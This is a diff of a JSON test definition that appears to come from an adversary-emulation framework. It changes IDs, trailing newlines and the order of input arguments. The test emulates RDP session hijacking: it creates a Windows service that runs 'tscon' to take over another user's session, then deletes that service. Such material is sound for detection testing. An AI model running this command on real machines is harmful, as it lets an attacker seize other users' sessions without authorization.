@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "a139bcdf-a712-451f-8b72-c43748e87e82",
+      "id": "406c854a-e587-4450-b9bc-cbf1e20f6ba2",
       "type": "execute-command",
       "data": {
-        "command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\"\nnet start sesshijack\n",
+        "command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\"\nnet start sesshijack",
         "command_type": "command_prompt"
       },
       "elevation_required": true
     },
     {
-      "id": "a5cbc78e-03ba-4390-a753-3cbff264782c",
+      "id": "e0cfd90f-6c14-432f-ac6a-2c2dcc85fe4b",
       "type": "execute-command",
       "data": {
-        "command": "sc.exe delete sesshijack \u003enul 2\u003e\u00261\n",
+        "command": "sc.exe delete sesshijack \u003enul 2\u003e\u00261",
         "command_type": "command_prompt"
       },
       "elevation_required": true
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "a139bcdf-a712-451f-8b72-c43748e87e82",
+      "s": "406c854a-e587-4450-b9bc-cbf1e20f6ba2",
       "p": "on-success",
-      "o": "a5cbc78e-03ba-4390-a753-3cbff264782c"
+      "o": "e0cfd90f-6c14-432f-ac6a-2c2dcc85fe4b"
     },
     {
-      "s": "a139bcdf-a712-451f-8b72-c43748e87e82",
+      "s": "406c854a-e587-4450-b9bc-cbf1e20f6ba2",
       "p": "on-failure",
-      "o": "a5cbc78e-03ba-4390-a753-3cbff264782c"
+      "o": "e0cfd90f-6c14-432f-ac6a-2c2dcc85fe4b"
     }
   ],
   "tags": [
@@ -43,16 +43,16 @@
   ],
   "input_arguments": [
     {
-      "name": "Session_ID",
-      "type": "string",
-      "description": "The ID of the session to which you want to connect",
-      "value": "1337"
-    },
-    {
       "name": "Destination_ID",
       "type": "string",
       "description": "Connect the session of another user to a different session",
       "value": "rdp-tcp#55"
+    },
+    {
+      "name": "Session_ID",
+      "type": "string",
+      "description": "The ID of the session to which you want to connect",
+      "value": "1337"
     }
   ]
 }
